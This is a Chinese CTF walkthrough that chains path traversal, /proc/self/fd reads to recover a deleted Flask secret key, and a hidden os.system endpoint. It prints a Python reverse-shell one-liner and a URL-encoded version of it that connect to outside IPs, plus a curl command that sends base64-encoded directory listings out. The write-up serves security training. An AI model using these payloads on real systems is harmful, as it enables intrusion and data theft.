##  前言	
这个题跟到wp做的，确实思路很像一个渗透过程了，值得好好学习。
##  wp
首先打开环境，F12，dirsearch和御剑都没有扫描出什么东西。然后输入一个输入框，填入抓包
![在这里插入图片描述](https://z3eyond-top-1304266053.cos.ap-chengdu.myqcloud.com/typora/44e21862c8984441aee77d595ae264b9.png)
有个url的GET参数，我们尝试SSRF
url=file://127.0.0.1/flag.php或者php伪协议，都没有什么反应。然后尝试目录穿越
```php
?url=../../etc/passwd
```
![在这里插入图片描述](https://z3eyond-top-1304266053.cos.ap-chengdu.myqcloud.com/typora/4b8f0f60bf204127a8ef07e5fb480008.png)
说明存在文件包含，目录穿越可以实现

我们知道/proc文件系统，所以我们使用目录穿越爆出文件目录
```php
?url=../../proc/self/cmdline
```
![在这里插入图片描述](https://z3eyond-top-1304266053.cos.ap-chengdu.myqcloud.com/typora/48f2c8be881842c4a27a732efd9380d6.png)
然后直接爆出app.py的源码

![在这里插入图片描述](https://z3eyond-top-1304266053.cos.ap-chengdu.myqcloud.com/typora/4841c2ea844e435b9fb9c9aa80c9fae1.png)
```python
from flask import Flask, Response
from flask import render_template
from flask import request
import os
import urllib

app = Flask(__name__)

SECRET_FILE = "/tmp/secret.txt"
f = open(SECRET_FILE)
SECRET_KEY = f.read().strip()
os.remove(SECRET_FILE)


@app.route('/')
def index():
    return render_template('search.html')


@app.route('/page')
def page():
    url = request.args.get("url")
    try:
        if not url.lower().startswith("file"):
            res = urllib.urlopen(url)
            value = res.read()
            response = Response(value, mimetype='application/octet-stream')
            response.headers['Content-Disposition'] = 'attachment; filename=beautiful.jpg'
            return response
        else:
            value = "HACK ERROR!"
    except:
        value = "SOMETHING WRONG!"
    return render_template('search.html', res=value)


@app.route('/no_one_know_the_manager')
def manager():
    key = request.args.get("key")
    print(SECRET_KEY)
    if key == SECRET_KEY:
        shell = request.args.get("shell")
        os.system(shell)
        res = "ok"
    else:
        res = "Wrong Key!"

    return res


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)
```
进行python代码审计
有用的代码
```python

SECRET_FILE = "/tmp/secret.txt"
f = open(SECRET_FILE)
SECRET_KEY = f.read().strip()
os.remove(SECRET_FILE)

@app.route('/no_one_know_the_manager')
def manager():
    key = request.args.get("key")
    print(SECRET_KEY)
    if key == SECRET_KEY:
        shell = request.args.get("shell")
        os.system(shell)
        res = "ok"
    else:
        res = "Wrong Key!"

    return res
```
首先知道了/no_one_know_the_manager页面
manager()函数中有个敏感的代码
```python
os.system(shell)
```
我们可以通过这个shell参数进行命令执行
但是需要key == SECRET_KEY。
我们就需要找到SECRET_KEY
![在这里插入图片描述](https://z3eyond-top-1304266053.cos.ap-chengdu.myqcloud.com/typora/8239337ed4b84a9584dc7ca07ac32275.png)
发现读取/tmp/secret.txt不成功，看到os.remove(SECRET_FILE)，说明这个文件已经删除了。
所以我们通过`/proc/self/fd/可变数字`来获得已经删除的文件内容。
进行爆破
![在这里插入图片描述](https://z3eyond-top-1304266053.cos.ap-chengdu.myqcloud.com/typora/570c1e74a4604268ac1b19561dde3b57.png)
发现`?url=../../proc/self/fd/3`是不同,得到
```
hFp5fd7AAAlgSMgzK7uYKv4yq0BOxauxWmJXwHCaBQY=
```
这个应该就是密匙了(密匙我重新试了一下不同)。
![在这里插入图片描述](https://z3eyond-top-1304266053.cos.ap-chengdu.myqcloud.com/typora/24c1960f0e7d4d63a3f74ff0fcefd61c.png)
但是没有回显ls的东西。
这儿我们就是用python反弹shell
```python
shell=python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("101.35.126.83",1515));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```
注意我们需要进行urlencode编码。
因为反弹shell的payload中有单引号和双引号，会影响传参。所以使用urlencode。

payload
```php
key=Goqm8uJYz9YzW8b6sO1WxEokWnaXM9TtaBoJIZa6WR4%3D&shell=python%20-c%20%27import%20socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket(socket.AF_INET%2Csocket.SOCK_STREAM)%3Bs.connect((%2242.193.170.176%22%2C10000))%3Bos.dup2(s.fileno()%2C0)%3B%20os.dup2(s.fileno()%2C1)%3B%20os.dup2(s.fileno()%2C2)%3Bp%3Dsubprocess.call(%5B%22%2Fbin%2Fsh%22%2C%22-i%22%5D)%3B%27
```
注意：
![在这里插入图片描述](https://z3eyond-top-1304266053.cos.ap-chengdu.myqcloud.com/typora/fe911b3d0801403cb758b00e2ca0a6c5.png)
还可以使用curl反弹shell
```php
?key=YBb%2FolIX5h4ChHDJYy%2BhypD0MtKjJyIs3fI3Jbma1SY%3D&shell=curl 118.***.***.***/`ls /|base64`
```
因为存在`\n`，所以我们需要base64加密。
补充：
关于python-c命令:
python -c 可以在命令行中执行 python 代码
```python
python -c "print('TTXT')"
```
但是引号不要重叠，否则会发生错误，一般使用三引号
```python
python -c '''
import arrow    
print(arrow.now())
'''
```
可以执行多行代码。
##  参考
[feng师傅的wp](https://blog.csdn.net/rfrder/article/details/112310943)
[反弹shell](https://blog.csdn.net/unexpectedthing/article/details/121234723)]
[关于/proc/self的学习](https://blog.csdn.net/unexpectedthing/article/details/121338877)